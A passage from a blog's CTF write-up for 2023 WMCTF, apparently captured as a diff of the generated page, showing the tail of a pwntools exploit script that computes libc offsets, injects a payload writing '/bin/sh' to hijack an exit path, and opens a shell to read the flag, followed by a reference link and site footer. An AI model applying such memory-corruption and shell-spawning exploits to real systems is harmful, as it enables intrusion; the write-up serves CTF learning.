function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">content</span>):</span><br><span class="line">    res = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content)):</span><br><span class="line">        res += <span class="string">b&#x27;.&#x27;</span> + p8(content[i]) + <span class="string">b&#x27;&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="comment"># dbpie(&#x27;0x1301  &#x27;)</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x01313&#x27;)</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io = process(pwnfile)</span><br><span class="line">        sla(<span class="string">b&#x27;ta size&#x27;</span>,<span class="string">b&#x27;1000000&#x27;</span>)</span><br><span class="line">        sla(<span class="string">b&#x27;size&#x27;</span>,<span class="string">b&#x27;100&#x27;</span>)</span><br><span class="line">        code=<span class="string">b&#x27;@&#x27;</span>+p32(<span class="number">0x7fc4cf08c968</span>-<span class="number">0x7fc4ced75010</span>)+write(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">        code+=<span class="string">b&#x27;@&#x27;</span>+p32(<span class="number">0x7fc4cf08cf60</span>-<span class="number">0x7fc4cf08c968</span>)+write(p32(<span class="number">0xb6e290</span>)[<span class="number">0</span>:<span class="number">3</span>])+<span class="string">b&#x27;q&#x27;</span></span><br><span class="line">        sla(<span class="string">b&#x27;code&#x27;</span>,code)</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line">        sl(<span class="string">b&#x27;cat /flag&#x27;</span>)</span><br><span class="line">        io.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        io.close()</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><strong>关于exit的利用：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/243196">https://www.anquanke.com/post/id/243196</a></strong></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#blindless"><span class="toc-number">1.</span> <span class="toc-text">blindless</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dl-fini"><span class="toc-number">2.</span> <span class="toc-text">_dl_fini</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exit-hook"><span class="toc-number">3.</span> <span class="toc-text">exit_hook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">4.</span> <span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/08/28/2023wmctf/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/08/28/2023wmctf/&text=2023 WMCTF"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/08/28/2023wmctf/&title=2023 WMCTF"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/08/28/2023wmctf/&is_video=false&description=2023 WMCTF"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2023 WMCTF&body=Check out this article: https://grxer.gitee.io/2023/08/28/2023wmctf/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/08/28/2023wmctf/&title=2023 WMCTF"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/08/28/2023wmctf/&title=2023 WMCTF"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/08/28/2023wmctf/&title=2023 WMCTF"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/08/28/2023wmctf/&title=2023 WMCTF"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/08/28/2023wmctf/&name=2023 WMCTF&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/08/28/2023wmctf/&t=2023 WMCTF"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2024
+    bxz
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?a22ef0bec4e4a9c7337bea6e37ff55c1";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
